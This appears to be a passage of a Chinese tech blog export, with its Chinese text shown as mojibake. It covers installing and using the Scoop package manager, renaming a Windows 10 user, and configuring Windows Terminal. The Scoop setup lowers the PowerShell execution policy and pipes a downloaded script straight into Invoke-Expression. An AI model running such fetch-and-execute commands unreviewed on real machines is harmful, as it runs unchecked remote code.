<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆè®¾ç½®å…è®¸è¿è¡Œè¿œç¨‹è„šæœ¬</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…scoop</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class="line"><span class="comment"># or shorter</span></span><br><span class="line"><span class="built_in">iwr</span> <span class="literal">-useb</span> get.scoop.sh | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœè¦å°†scoopå®‰è£…åˆ°å…¶ä»–ä½ç½®</span></span><br><span class="line"><span class="variable">$env:SCOOP</span> = <span class="string">&#x27;D:\scoop&#x27;</span></span><br><span class="line">[<span class="type">environment</span>]::setEnvironmentVariable(<span class="string">&#x27;SCOOP&#x27;</span>, <span class="variable">$env:SCOOP</span>, <span class="string">&#x27;User&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-useb</span> get.scoop.sh | <span class="built_in">Invoke-Expression</span></span><br></pre></td></tr></table></figure>



<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> scoop</span><br><span class="line">Usage: scoop &lt;command&gt; [&lt;<span class="type">args</span>&gt;]</span><br><span class="line"></span><br><span class="line">Some useful commands are:</span><br><span class="line"></span><br><span class="line">alias       Manage scoop aliases</span><br><span class="line">bucket      Manage Scoop buckets</span><br><span class="line">cache       Show or <span class="built_in">clear</span> the download cache</span><br><span class="line"><span class="built_in">cat</span>         Show content of specified manifest.</span><br><span class="line">checkup     Check <span class="keyword">for</span> potential problems</span><br><span class="line">cleanup     Cleanup apps by removing old versions</span><br><span class="line">config      Get or <span class="built_in">set</span> configuration values</span><br><span class="line">create      Create a custom app manifest</span><br><span class="line">depends     List dependencies <span class="keyword">for</span> an app</span><br><span class="line">export      Exports (an importable) list of installed apps</span><br><span class="line">help        Show help <span class="keyword">for</span> a command</span><br><span class="line">hold        Hold an app to disable updates</span><br><span class="line">home        Opens the app homepage</span><br><span class="line">info        Display information about an app</span><br><span class="line">install     Install apps</span><br><span class="line">list        List installed apps</span><br><span class="line">prefix      Returns the path to the specified app</span><br><span class="line">reset       Reset an app to resolve conflicts</span><br><span class="line">search      Search available apps</span><br><span class="line">status      Show status and check <span class="keyword">for</span> new app versions</span><br><span class="line">unhold      Unhold an app to enable updates</span><br><span class="line">uninstall   Uninstall an app</span><br><span class="line">update      Update apps, or Scoop itself</span><br><span class="line">virustotal  Look <span class="keyword">for</span> app<span class="string">&#x27;s hash on virustotal.com</span></span><br><span class="line"><span class="string">which       Locate a shim/executable (similar to &#x27;</span>which<span class="string">&#x27; on Linux)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Type &#x27;</span>scoop help &lt;command&gt;<span class="string">&#x27; to get help for a specific command.</span></span><br></pre></td></tr></table></figure>





<h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><h3 id="æ·»åŠ -bucket"><a href="#æ·»åŠ -bucket" class="headerlink" title="æ·»åŠ  bucket"></a>æ·»åŠ  bucket</h3><p>è‡ªå¸¦ä¸‹é¢å‡ ä¸ª bucketã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop bucket known</span><br><span class="line"></span><br><span class="line">-   mainï¼Œè‡ªå¸¦çš„è½¯ä»¶ä»“åº“</span><br><span class="line">-   extrasï¼Œä¸€äº›é¢å¤–çš„å¸¦æœ‰å›¾å½¢ç•Œé¢è½¯ä»¶çš„ä»“åº“</span><br><span class="line">-   versionsï¼ŒåŒ…å«ä¸€äº›ç¼–ç¨‹è¯­è¨€å’Œç±»åº“çš„å„ç§ç‰ˆæœ¬çš„ä»“åº“</span><br><span class="line">-   nirsoftï¼ŒåŒ…å« nirsoft è½¯ä»¶çš„ä»“åº“</span><br><span class="line">-   phpï¼Œå„ç§ php çš„ä»“åº“</span><br><span class="line">-   nerd<span class="literal">-fonts</span>ï¼ŒåŒ…å«å„ç§ nerd<span class="literal">-fonts</span> å­—ä½“</span><br><span class="line">-   nonportableï¼ŒåŒ…å«å„ç§éç»¿è‰²ç‰ˆè½¯ä»¶çš„ä»“åº“</span><br><span class="line">-   javaï¼Œå„ç§ java ç‰ˆæœ¬éƒ½æœ‰çš„ä»“åº“</span><br><span class="line">-   gamesï¼Œä¸€äº›æ¸¸æˆå’Œç›¸å…³å·¥å…·çš„ä»“åº“</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¸¸ç”¨ï¼š extras javamain nirsoft nonportable versions </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ bucket</span></span><br><span class="line">scoop bucket add extra</span><br><span class="line">scoop bucket add java</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>æ·»åŠ ç¬¬ä¸‰æ–¹bucket</strong></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># eg</span></span><br><span class="line">scoop bucket add Ash258 https://github.com/Ash258/Scoop<span class="literal">-Ash258</span>.git</span><br></pre></td></tr></table></figure>



<h3 id="ä½¿ç”¨ä»£ç†"><a href="#ä½¿ç”¨ä»£ç†" class="headerlink" title="ä½¿ç”¨ä»£ç†"></a>ä½¿ç”¨ä»£ç†</h3><p>scoop é»˜è®¤ä¸‹è½½æ¯”è¾ƒæ…¢ï¼Œå¦‚æœä½ æœ‰ä»£ç†çš„è¯ï¼Œå¯ä»¥ä¸º scoop è®¾ç½®ä»£ç†ï¼ŒåŠ é€Ÿè½¯ä»¶çš„ä¸‹è½½ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop config proxy username:password@proxy.example.org:<span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eg</span></span><br><span class="line">scoop config proxy localhost:<span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete Proxy Config</span></span><br><span class="line">scop config <span class="built_in">rm</span> proxy</span><br></pre></td></tr></table></figure>



<h3 id="å¤šè¿æ¥ä¸‹è½½"><a href="#å¤šè¿æ¥ä¸‹è½½" class="headerlink" title="å¤šè¿æ¥ä¸‹è½½"></a>å¤šè¿æ¥ä¸‹è½½</h3><p>scoop ä¹Ÿæ”¯æŒå¤šè¿æ¥ä¸‹è½½ï¼Œåªéœ€è¦å®‰è£… aria2ï¼Œscoop å°±ä¼šè‡ªåŠ¨åˆ©ç”¨ aria2 æ¥è¿›è¡Œå¤šè¿æ¥ä¸‹è½½ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install aria2</span><br></pre></td></tr></table></figure>

<p>å…³äºä¸‹è½½çš„å…¶ä»–è¯´æ˜ï¼Œå‚è§<a href="https://github.com/ScoopInstaller/Scoop#multi-connection-downloads-with-aria2">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop config aria2<span class="literal">-enabled</span> true <span class="comment"># å¼€å¯aria2</span></span><br><span class="line">scoop config aria2<span class="literal">-enabled</span> false <span class="comment"># å…³é—­aria2</span></span><br></pre></td></tr></table></figure>



<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><h3 id="å®‰è£…-å¸è½½install"><a href="#å®‰è£…-å¸è½½install" class="headerlink" title="å®‰è£…&#x2F;å¸è½½install"></a>å®‰è£…&#x2F;å¸è½½install</h3><p>é¦–å…ˆéœ€è¦æœç´¢è½¯ä»¶åŒ…çš„åç§°ï¼Œç„¶åå°±å¯ä»¥å®‰è£…ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœç´¢è½¯ä»¶</span></span><br><span class="line">scoop search jdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®è¿”å›çš„ç»“æœè¿›è¡Œå®‰è£…</span></span><br><span class="line">scoop install openjdk17</span><br></pre></td></tr></table></figure>

<p>ä¸å†éœ€è¦çš„è½¯ä»¶åŒ…å°±å¯ä»¥å¸è½½ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop uninstall openjdk17</span><br></pre></td></tr></table></figure>



<h3 id="æ›´æ–°ç¨‹åºupdate"><a href="#æ›´æ–°ç¨‹åºupdate" class="headerlink" title="æ›´æ–°ç¨‹åºupdate"></a>æ›´æ–°ç¨‹åºupdate</h3><p>è·å–æ›´æ–°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop update</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹éœ€è¦æ›´æ–°çš„ç¨‹åº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop status</span><br></pre></td></tr></table></figure>

<p>æ›´æ–° scoop è‡ªå·±ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop update scoop</span><br></pre></td></tr></table></figure>

<p>æ›´æ–°æ‰€æœ‰è½¯ä»¶ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop update *</span><br></pre></td></tr></table></figure>



<h3 id="ç®¡ç†å¤šç‰ˆæœ¬verison"><a href="#ç®¡ç†å¤šç‰ˆæœ¬verison" class="headerlink" title="ç®¡ç†å¤šç‰ˆæœ¬verison"></a>ç®¡ç†å¤šç‰ˆæœ¬verison</h3><p>ç®¡ç†å¤šç‰ˆæœ¬éœ€è¦æ·»åŠ versionåº“</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…ˆæ·»åŠ  versions bucket</span></span><br><span class="line">scoop bucket add versions</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŒæ—¶å®‰è£… Python 2.7 å’Œæœ€æ–°ç‰ˆæœ¬</span></span><br><span class="line">scoop install python27 python</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ¢åˆ° Python 2.7.x</span></span><br><span class="line">scoop reset python27</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ¢åˆ° Python 3.x</span></span><br><span class="line">scoop reset python</span><br></pre></td></tr></table></figure>



<h3 id="æ¸…ç†clear"><a href="#æ¸…ç†clear" class="headerlink" title="æ¸…ç†clear"></a>æ¸…ç†clear</h3><p>scoop æ›´æ–°è½¯ä»¶çš„æ—¶å€™ä¼šä¿ç•™å‡ ä¸ªæ—§ç‰ˆæœ¬ï¼Œå‡å¦‚ä½ ä¸å†éœ€è¦è¿™äº›æ—§ç‰ˆæœ¬ï¼Œå¯ä»¥æŠŠä»–ä»¬æ¸…ç†æ‰ã€‚</p>
<p>é¡ºä¾¿ä¹Ÿå¯ä»¥æŠŠä¸‹è½½ç¼“å­˜æ¸…ç†æ‰ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ¸…ç†è½¯ä»¶çš„æ—§ç‰ˆæœ¬</span></span><br><span class="line">scoop cleanup *</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…ç†è½¯ä»¶çš„ä¸‹è½½ç¼“å­˜</span></span><br><span class="line">scoop cache <span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>



<h2 id="å¸¸ç”¨ç¨‹åº"><a href="#å¸¸ç”¨ç¨‹åº" class="headerlink" title="å¸¸ç”¨ç¨‹åº"></a>å¸¸ç”¨ç¨‹åº</h2><ul>
<li><p>aria2</p>
<blockquote>
<p>  å¤šè¿æ¥ä¸‹è½½å™¨</p>
</blockquote>
</li>
<li><p>git</p>
</li>
<li><p>sudo</p>
<blockquote>
<p>  ä¸ç”¨æ‰“å¼€æ–°çª—å£ï¼Œå¿«é€Ÿä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œ</p>
</blockquote>
</li>
<li><p>wget&#x2F;curl</p>
</li>
<li><p>starship</p>
<blockquote>
<p>  DIY powershellå‘½ä»¤æç¤º</p>
</blockquote>
</li>
<li><p>mpv</p>
<blockquote>
<p>  å¼€æºåª’ä½“æ’­æ”¾å™¨</p>
</blockquote>
</li>
<li><p>adb</p>
<blockquote>
<p>  link to Adnroid</p>
</blockquote>
</li>
<li><p>å¼€å‘ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python go maven </span><br><span class="line">php56 php74</span><br></pre></td></tr></table></figure>
</li>
<li><p>neovim</p>
<blockquote>
<p>  ç°ä»£ç»ˆç«¯æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œyyds</p>
</blockquote>
</li>
<li><p>netcat</p>
<blockquote>
<p>  â€œç‘å£«å†›åˆ€â€</p>
</blockquote>
</li>
<li><p>openssl</p>
</li>
<li><p>screentogif</p>
<blockquote>
<p>  gif å±å¹•å½•åˆ¶å·¥å…·</p>
</blockquote>
</li>
</ul>
<h2 id="äº®ç‚¹"><a href="#äº®ç‚¹" class="headerlink" title="äº®ç‚¹"></a>äº®ç‚¹</h2><ul>
<li>å½“å‰åº”ç”¨ç‰ˆæœ¬è·¯å¾„ ä½¿ç”¨  Currentâ€ æ–‡ä»¶å¤¹ è¿›è¡Œè½¯é“¾æ¥ï¼Œæ–¹ä¾¿è¿›è¡Œè·¯å¾„é…ç½®ã€‚</li>
<li>èƒ½å¤Ÿè‡ªå®šä¹‰bucketåº“ï¼Œæ–¹ä¾¿æ—¥ådiyï¼ŒæŠŠè‡ªå·±å¸¸ç”¨çš„æ·»åŠ è¿›å»ï¼Œè¿˜èƒ½æ–°å¢è‡ªç”¨çš„å…¶ä»–ç¨‹åºã€‚</li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>scoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10æ›´æ”¹ç”¨æˆ·åæ–¹å¼</title>
    <url>/articles/c63c4f59/</url>
    <content><![CDATA[<h2 id="æ›´æ”¹æ–¹å¼"><a href="#æ›´æ”¹æ–¹å¼" class="headerlink" title="æ›´æ”¹æ–¹å¼"></a>æ›´æ”¹æ–¹å¼</h2><hr>
<p>ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€ä¸€ä¸ªCMD</p>
<h3 id="ä¿®æ”¹ç”¨æˆ·å"><a href="#ä¿®æ”¹ç”¨æˆ·å" class="headerlink" title="ä¿®æ”¹ç”¨æˆ·å"></a>ä¿®æ”¹ç”¨æˆ·å</h3><p>è¾“å…¥ <code>control userpasswords2</code> ï¼Œå›è½¦ï¼›</p>
<p>ç‚¹å‡»å±æ€§ï¼Œä¿®æ”¹ç”¨æˆ·åï¼Œç‚¹å‡»ç¡®å®šï¼›</p>
<h3 id="æ³¨å†Œè¡¨ä¿®æ”¹è·¯å¾„ä½ç½®"><a href="#æ³¨å†Œè¡¨ä¿®æ”¹è·¯å¾„ä½ç½®" class="headerlink" title="æ³¨å†Œè¡¨ä¿®æ”¹è·¯å¾„ä½ç½®"></a>æ³¨å†Œè¡¨ä¿®æ”¹è·¯å¾„ä½ç½®</h3><p>æ‰“å¼€è¿è¡Œï¼Œè¾“å…¥regeditï¼Œå›è½¦ï¼›<br>å®šä½åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileListï¼›</span><br></pre></td></tr></table></figure>
<p>é€‰ä¸­ä¸‹é¢åå­—æœ€é•¿çš„é¡¹ï¼ŒåŒå‡»å³ä¾§çš„ProfileImagePathï¼Œä¿®æ”¹ C:\Users\ åçš„ç”¨æˆ·åï¼Œç‚¹å‡»ç¡®å®šï¼›</p>
<p>æ³¨é”€å¹¶é‡æ–°ç™»å½•ï¼›</p>
<h3 id="é‡å‘½åç”¨æˆ·æ–‡ä»¶å¤¹"><a href="#é‡å‘½åç”¨æˆ·æ–‡ä»¶å¤¹" class="headerlink" title="é‡å‘½åç”¨æˆ·æ–‡ä»¶å¤¹"></a>é‡å‘½åç”¨æˆ·æ–‡ä»¶å¤¹</h3><p>æ‰“å¼€ C:\User\ï¼Œ</p>
<p>å°†æ–°çš„ç”¨æˆ·åæ–‡ä»¶å¤¹åˆ é™¤ï¼Œ</p>
<p>å†å°†åŸæ¥çš„çš„ç”¨æˆ·åæ–‡ä»¶å¤¹é‡å‘½åä¸ºæ–°çš„ç”¨æˆ·åï¼›</p>
<p>å†æ¬¡æ³¨é”€å¹¶é‡æ–°ç™»å½•ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/u011479200/article/details/107902826">https://blog.csdn.net/u011479200/article/details/107902826</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Termianl ç¾åŒ–é…ç½®æŒ‡åŒ—</title>
    <url>/articles/dffc1475/</url>
    <content><![CDATA[<h2 id="Windows-Terminal-ä»‹ç»"><a href="#Windows-Terminal-ä»‹ç»" class="headerlink" title="Windows Terminal ä»‹ç»"></a>Windows Terminal ä»‹ç»</h2><blockquote>
<p>  å®˜æ–¹githubåœ°å€ï¼š<a href="https://github.com/microsoft/terminal">https://github.com/microsoft/terminal</a></p>
<p>  å°‘æ•°æ´¾ï¼š<a href="https://sspai.com/post/59380">https://sspai.com/post/59380</a></p>
</blockquote>
<p>æ–°æ™‹ Windows ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼š<a href="https://github.com/microsoft/terminal">Windows Terminal</a>ï¼Œè‡ªå‘å¸ƒä»¥æ¥å°±å¤‡å—å¼€å‘è€…çš„å–œçˆ±ï¼Œå¹¶ä¸ <a href="https://sspai.com/post/43813">WSL</a> ä¸€èµ·ï¼Œè®©ä¸å°‘å…ˆå‰é Linux ä¸ç”¨çš„å¼€å‘è€…æœ‹å‹ä»¬å‘ Windows å€¾æ–œã€‚Windows Terminal ä¸ä»…å¼€æºå…è´¹ï¼Œè¿˜æ‹¥æœ‰ç°ä»£åŒ–çš„ç•Œé¢ã€å®Œæ•´çš„å­—ä½“å­—ç¬¦æ¸²æŸ“æœºåˆ¶ï¼ˆåŒ…æ‹¬ Emojiï¼‰ã€GPU åŠ é€Ÿå’Œ Fluent è®¾è®¡é£æ ¼ã€‚è¿™äº›éƒ½è®© Windows Terminal æˆä¸º Windows å¹³å°æœ€å…ˆè¿›çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼ŒåŠ›å‹ä¸€ä¼—ç¬¬ä¸‰æ–¹ç»ˆç«¯ä»¥åŠ Windows è‡ªå¸¦çš„é»˜è®¤ç»ˆç«¯ã€‚</p>
<ul>
<li>æ”¯æŒWSL2ï¼ŒSSHï¼ŒPowershellï¼Œcmdå’Œå…¶ä»–å‘½ä»¤è¡Œ</li>
<li>å¤šä¸ªé€‰é¡¹å¡å’Œæ‹†åˆ†çª—æ ¼</li>
<li>æœç´¢æ¡†</li>
<li>è‡ªå®šä¹‰é”®ç»‘å®š</li>
<li>GPUåŠ é€Ÿæ–‡å­—æ¸²æŸ“</li>
<li>ç¾è§‚çš„æ–°å­—ä½“Cascadia Code</li>
<li>èµ„æºä½¿ç”¨ç‡ä½ï¼ˆæ¯ä¸ªé€‰é¡¹å¡é€šå¸¸10MBï¼‰</li>
<li>è‡ªåŠ¨æ›´æ–°ï¼ˆå¦‚æœä½¿ç”¨Microsoft Storeï¼‰</li>
</ul>
<p>Windows Terminal 2.0 å¼€å‘è·¯çº¿å›¾ï¼š<a href="https://github.com/microsoft/terminal/blob/main/doc/terminal-v2-roadmap.md">https://github.com/microsoft/terminal/blob/main/doc/terminal-v2-roadmap.md</a></p>
<h2 id="å®‰è£…-Windows-Terminal"><a href="#å®‰è£…-Windows-Terminal" class="headerlink" title="å®‰è£… Windows Terminal"></a>å®‰è£… Windows Terminal</h2><p>åœ¨å®˜æ–¹ <a href="https://github.com/microsoft/terminal">README</a> ä¸­ï¼Œå®‰è£…Windows Terminalæœ‰å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<ul>
<li><p><strong>Microsoft Store</strong>ï¼ˆæ¨èï¼‰</p>
</li>
<li><p><strong>Github</strong> </p>
<p><a href="https://github.com/microsoft/terminal/releases">https://github.com/microsoft/terminal/releases</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Add-AppxPackage Microsoft.WindowsTerminal_&lt;versionNumber&gt;.msixbundle</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>winget</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winget install --<span class="built_in">id</span>=Microsoft.WindowsTerminal -e</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Chocolatey</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">choco install microsoft-windows-terminal</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Scoop</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop bucket add extras</span><br><span class="line">scoop install windows-terminal</span><br></pre></td></tr></table></figure></li>
</ul>
<p>è¿™é‡Œä½¿ç”¨Microsoft Storeè¿›è¡Œå®‰è£…ï¼Œç®€å•ç›´æ¥ï¼Œè¿˜èƒ½è‡ªåŠ¨æ›´æ–°ã€dogeã€‘</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/02/202202071644240407.png" alt="image-20220207200021516"></p>
<h2 id="Windows-Terminal-é…ç½®"><a href="#Windows-Terminal-é…ç½®" class="headerlink" title="Windows Terminal é…ç½®"></a>Windows Terminal é…ç½®</h2><blockquote>
<p>  å®˜æ–¹é…ç½®æ–‡æ¡£ï¼š<a href="https://docs.microsoft.com/zh-cn/windows/terminal/customize-settings/profile-general">https://docs.microsoft.com/zh-cn/windows/terminal/customize-settings/profile-general</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + ï¼Œè¿›å…¥è®¾ç½®é¡µé¢</span><br><span class="line">ç›®å‰ç‰ˆæœ¬å·²ç»å®ç°å¤§éƒ¨åˆ†å†…å®¹çš„å¯è§†åŒ–è®¾ç½®ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›å…¥è®¾ç½®ç•Œé¢åï¼Œå·¦ä¸‹è§’ç‚¹å‡»è®¾ç½®æŒ‰é’®ï¼Œå³å¯ç¼–è¾‘setting.jsonæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h3 id="çª—å£è®¾ç½®"><a href="#çª—å£è®¾ç½®" class="headerlink" title="çª—å£è®¾ç½®"></a>çª—å£è®¾ç½®</h3><blockquote>
<p>  é€šè¿‡åæ ‡ â€œinitialPositionâ€å‚æ•° æ§åˆ¶çª—å£ä½ç½®ã€‚</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;initialCols&quot;</span><span class="punctuation">:</span> <span class="number">97</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;initialPosition&quot;</span><span class="punctuation">:</span> <span class="string">&quot;480,250&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;initialRows&quot;</span><span class="punctuation">:</span> <span class="number">27</span>ï¼Œ</span><br></pre></td></tr></table></figure>

<h3 id="é¢œè‰²é…ç½®"><a href="#é¢œè‰²é…ç½®" class="headerlink" title="é¢œè‰²é…ç½®"></a>é¢œè‰²é…ç½®</h3><blockquote>
<p>  åœ¨çº¿é¢„è§ˆé¢œè‰²é…ç½®ï¼š<a href="https://windowsterminalthemes.dev/">https://windowsterminalthemes.dev/</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// oneï¼Œè‡ªç”¨é…è‰²ï¼Œä¿®æ”¹è‡ªone of hack</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#001B26&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;black&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#282C34&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;blue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#61AFEF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#5A6374&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#61AFEF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightCyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#56B6C2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightGreen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#98C379&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightPurple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#C678DD&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightRed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E06C75&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightWhite&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#DCDFE4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightYellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E5C07B&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cursorColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#56B6C2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#DCDFE4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;green&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#98C379&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;One&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;purple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#C678DD&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;red&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E06C75&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;selectionBackground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;white&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#DCDFE4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;yellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E5C07B&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Profileé…ç½®"><a href="#Profileé…ç½®" class="headerlink" title="Profileé…ç½®"></a>Profileé…ç½®</h3><blockquote>
<p>  å·²å®ç°å¯è§†åŒ–é…ç½®ã€‚</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸ªäººä½¿ç”¨é…ç½®</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;acrylicOpacity&quot;</span><span class="punctuation">:</span> <span class="number">0.6</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;backgroundImage&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;backgroundImageOpacity&quot;</span><span class="punctuation">:</span> <span class="number">0.0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bellStyle&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;window&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;taskbar&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;closeOnExit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;graceful&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;colorScheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;One&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;commandline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:/PowerShell/7/pwsh.exe -nologo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span 